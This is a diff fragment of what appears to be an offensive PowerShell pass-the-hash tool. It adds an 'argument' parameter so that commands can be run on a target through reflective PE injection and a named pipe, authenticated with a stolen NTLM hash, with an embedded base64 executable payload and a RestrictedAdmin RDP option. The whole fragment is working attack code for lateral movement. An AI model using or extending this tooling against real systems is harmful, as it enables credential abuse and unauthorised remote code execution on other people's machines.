@@ -1734,6 +1734,7 @@ param
     [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
     [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain = "$env:computername",
     [parameter(Mandatory=$false)][switch]$RDP,
+    [parameter(Mandatory=$false)][String]$argument,
     [parameter(Mandatory=$false)][String]$PipeName,
     [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
     [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash
@@ -1760,6 +1761,7 @@ param
 (
     [String]$binary = "C:\windows\system32\cmd.exe",
     [bool]$RDP,
+    [String]$argument,
     [String]$PipeName
 )
 
@@ -1769,6 +1771,7 @@ param
 (
     [String]$binary = "C:\windows\system32\cmd.exe",
     [bool]$RDP,
+    [String]$argument,
     [String]$PipeName
 )
 function Invoke-PEInjection
@@ -4689,14 +4692,18 @@ $executable86 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  {
     Invoke-PEInjection -PEBytes $PEBytes -ExeArgs "-e C:\windows\system32\mstsc.exe -a /RestrictedAdmin -p $PipeName"
  }
+ elseif($argument -ne $null)
+ {
+    Invoke-PEInjection -PEBytes $PEBytes -ExeArgs "-e $binary -p $PipeName -a ""$argument"""
+ }
  else
  {
     Invoke-PEInjection -PEBytes $PEBytes -ExeArgs "-e $binary -p $PipeName"
  }
  }
- onlytogettheoutput -binary $binary -PipeName $PipeName -RDP $RDP
+ onlytogettheoutput -binary $binary -PipeName $PipeName -RDP $RDP -argument $argument
 
- } -ArgumentList $binary,$RDP,$Pipename
+ } -ArgumentList $binary,$RDP,$argument,$Pipename
  Sleep 4
 
  Invoke-NamedPipePTH -Username $Username -Hash $Hash -Target $Target -Domain $domain -PipeName $PipeName
